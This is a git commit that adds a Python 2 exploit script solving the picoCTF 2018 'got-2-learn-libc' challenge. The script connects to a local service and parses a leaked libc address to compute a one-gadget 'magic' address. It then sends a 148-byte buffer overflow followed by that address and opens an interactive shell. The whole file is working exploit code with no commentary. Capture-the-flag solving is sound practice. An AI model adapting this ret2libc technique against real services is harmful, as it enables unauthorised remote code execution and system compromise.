96ec586fd6b95bf4c246a985e593c03fef7426ca
Marco Garlet <marcogarlet@gmail.com>
2018-10-12 19:53:20 +0200

    picoCTF2018

---
+++ picoCTF2018/got-2-learn-libc/attack.py
@@ -0,0 +1,45 @@
+#!/usr/bin/env python2
+
+import time, sys, socket, telnetlib
+from struct import *
+
+def recvuntil(t):
+    data = ''
+    while not data.endswith(t):
+        tmp = s.recv(1)
+        if not tmp: break
+        data += tmp
+
+    return data
+
+def interactive():
+    t = telnetlib.Telnet()
+    t.sock = s
+    t.interact()
+def p32(x): return pack('<I', x)
+
+
+off_write=869312
+off_magic=239628
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("localhost", 2323))
+recvuntil("\n") # here
+recvuntil("\n") #empty line
+recvuntil("\n") # puts
+recvuntil("\n") # flush
+recvuntil("\n") # read
+addr_write=recvuntil("\n").split()[1] # write
+print(addr_write)
+recvuntil("\n") #string
+recvuntil("\n") #line
+recvuntil("\n") #enter
+addr_write=int(addr_write,0)
+print(addr_write)
+base=addr_write-off_write
+magic=off_magic+base
+
+s.send("a"*148+p32(magic)*8+"\n")
+interactive()
+
+
